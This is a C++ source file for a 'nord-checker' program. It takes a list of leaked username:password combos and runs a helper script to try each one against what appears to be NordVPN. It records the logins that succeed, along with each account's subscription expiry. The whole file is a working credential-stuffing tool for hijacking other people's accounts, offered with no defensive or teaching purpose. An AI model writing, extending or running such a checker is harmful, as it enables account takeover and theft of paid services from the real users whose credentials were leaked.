#include <iostream>
#include <string>
#include<cstring>
#include <fstream>
#include <unistd.h>
#include <sys/wait.h>

//#define __DEBUG
#define TEMPFILE ".tempfile.txt"
#define SCRIPT "./script.sh"
#define LIMIT	50
#define BUFLEN 50
using namespace std;

void parseCombo(const string& combo, string& username, string& password);
bool checkStatus(void);
string getExpiry(void);

int main(int argc, char* argv[])
{
    if(argc != 5)
    {

        cout << "[ERROR]: nord-checker: Invalid Number of Arguments\nUsage: " << "./nordchecker -f {input_file_path} -o {output_file_path}\n";
        return -1;
    }

    if(strcmp(argv[1], "-i") != 0 && strcmp(argv[1], "--input") != 0)
    {
        cout << "[ERROR]: nord-checker: Invalid Flag: " << argv[1] << '\n';
        return -1;
    }

    if(strcmp(argv[3], "-o") != 0 && strcmp(argv[3], "--output") != 0)
    {
        cout << "[ERROR]: nord-checker: Invalid Flag: " << argv[3] << '\n';
        return -1;
    }

    ifstream ifile{argv[2]};
    if(ifile.fail() || ifile.bad())
    {
        cout << "[ERROR]: nord-checker: Failed to Open Input file\n";
        return -1;
    }

    ofstream ofile{argv[4], std::fstream::out | std::fstream::app};
    if(ofile.fail() || ofile.bad())
    {
        cout << "[ERROR]: nord-checker: Failed to Open Output file\n";
    }

    string combo, username, password;

    int count{0};
    while(count < LIMIT && !ifile.eof())
    {
        getline(ifile, combo);
        parseCombo(combo, username, password);

        pid_t rpid = fork();
        if(rpid == -1)
        {
            perror("[ERROR]: nordchecker: fork");
            return -1;
        }

        if(rpid == 0)
        {
            int ret = execlp(SCRIPT, SCRIPT, username.c_str(), password.c_str(), nullptr);
            if(ret == -1)
            {
                perror("[ERROR]: nordchecker: execvp");
                return -1;
            }
        }
    
	#ifdef __DEBUG
	cout << "CPID Before Wait: " << rpid << '\n';
	#endif


        pid_t cpid = wait(nullptr);

	#ifdef __DEBUG
	cout << "CPID By Wait: " << cpid << '\n';
	#endif
	
        bool status = checkStatus();
        if(status)
        {
            string expiry = getExpiry();
            ofile << combo << "\t|\tExpiry: " << expiry << endl;
            cout << "[SUCCESS]: " << combo << "\t|\tExpiry: " << expiry << '\n';
        }
        else
        {
            cout << "[FAILURE]: " << combo << '\n';
        }

        count++;
    }


    ofile.close();
    ifile.close();
    
    return 0;
}

void parseCombo(const string& combo, string& username, string& password)
{
    size_t delimPos = combo.find(":");
    username = combo.substr(0, delimPos);

    #ifdef __DEBUG
        cout << "Username: " << username << '\n';
    #endif

    password = combo.substr(delimPos+1, string::npos);

    #ifdef __DEBUG
        cout << "Password: " << password << '\n';
	cout << "Size of Password: " << strlen(password.c_str()) << '\n';
	cout << "Last Character: " << (int)password[8] << '\n';
    #endif

    return ;
}

bool checkStatus(void)
{
    string line;
    ifstream tempfile{TEMPFILE};
    if(!tempfile.good())
    {
	    cout << "[ERROR]: checkStatus: Failed to Open tempfile\n";
	    exit(-1);
    }
    while(!tempfile.eof() && tempfile.good())
    {
        getline(tempfile, line);
	#ifdef __DEBUG
		cout << line << '\n';
	#endif

        if(line.find("Welcome") != string::npos)
            return true;
    }

    return false;
}

string getExpiry(void)
{
    string line{"Unknown"};
    ifstream tempfile{TEMPFILE};
    while(!tempfile.eof() && tempfile.good())
    {
        getline(tempfile, line);
        size_t reqIndex = line.find("VPN Service:");
        if(reqIndex != string::npos)
            return line.substr(reqIndex + 12, string::npos);
    }
    
    return line;
}
